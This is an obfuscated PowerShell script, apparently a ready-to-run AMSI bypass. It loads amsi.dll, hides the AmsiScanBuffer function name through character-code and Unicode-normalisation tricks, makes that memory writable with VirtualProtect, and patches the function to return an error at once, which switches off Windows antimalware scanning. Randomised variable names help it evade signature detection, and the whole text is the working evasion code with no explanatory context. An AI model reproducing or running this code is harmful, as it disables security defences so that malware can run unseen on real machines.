$jOKbJnQrufNhNB1r = @"
using System;
using System.Runtime.InteropServices;
public class jOKbJnQrufNhNB1r {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr gjCcGCyE1cIbcITqf, string KytB);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr WM3oXCntkqmqIF, UIntPtr UZ4tUb, uint jyTKldga6eFfglAXGNV, out uint nHthLLlCD8Mr);
}
"@

Add-Type $jOKbJnQrufNhNB1r

$YVl2sb8 = [jOKbJnQrufNhNB1r]::LoadLibrary("$(('äms'+'î.d'+'ll').NoRmaLIzE([chAR]([bYte]0x46)+[CHAr]([BYTE]0x6f)+[cHar]([byTe]0x72)+[CHar](109)+[cHAr]([bytE]0x44)) -replace [Char](92*21/21)+[cHAR](112)+[CHar]([bYTe]0x7b)+[chaR]([bYTE]0x4d)+[ChAr](110)+[cHar](125))")
$M2LAOqN = [jOKbJnQrufNhNB1r]::GetProcAddress($YVl2sb8, "$(('ÃmsíScânBû'+'ffèr').normalIZe([ChAR]([Byte]0x46)+[Char](111+46-46)+[ChaR](114)+[chaR]([ByTE]0x6d)+[CHAr]([byTE]0x44)) -replace [ChAR](33+59)+[cHaR](30+82)+[cHar](105+18)+[Char](31+46)+[Char](110)+[ChAR](125*123/123))")
$p = 0
[jOKbJnQrufNhNB1r]::VirtualProtect($M2LAOqN, [uint32]5, 0x40, [ref]$p)
$DZwq = "0xB8"
$pJvqUfYcuBqbUeQ2 = "0x57"
$E5caz58lUM18 = "0x00"
$FX1xh = "0x07"
$abEEbTPzzjn7 = "0x80"
$v8sEW2q1LS6cJ5 = "0xC3"
$c9pi0J = [Byte[]] ($DZwq,$pJvqUfYcuBqbUeQ2,$E5caz58lUM18,$FX1xh,+$abEEbTPzzjn7,+$v8sEW2q1LS6cJ5)
[System.Runtime.InteropServices.Marshal]::Copy($c9pi0J, 0, $M2LAOqN, 6)